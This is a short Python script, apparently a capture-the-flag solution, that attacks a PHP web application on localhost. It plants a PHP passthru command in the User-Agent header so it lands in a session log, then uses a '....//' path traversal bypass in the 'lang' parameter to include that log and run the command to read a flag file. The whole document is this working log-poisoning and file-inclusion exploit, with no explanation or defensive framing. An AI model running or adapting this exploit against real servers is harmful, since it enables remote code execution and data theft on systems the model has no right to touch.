import requests

url='http://localhost/'
auth=('user','password')

session = requests.Session()
user_agent = "<?php passthru('cat /pathflag'); ?>"
headers={'User-Agent': user_agent}
response = session.get(url, auth=auth, headers=headers, params={'lang': '../'})
id = session.cookies.get('PHPSESSID')
cookies = {'PHPSESSID': id}
payload = f'....//logs/session_{id}.log'

response = session.get(url, auth=auth, params={'lang': payload})

print(response.text)
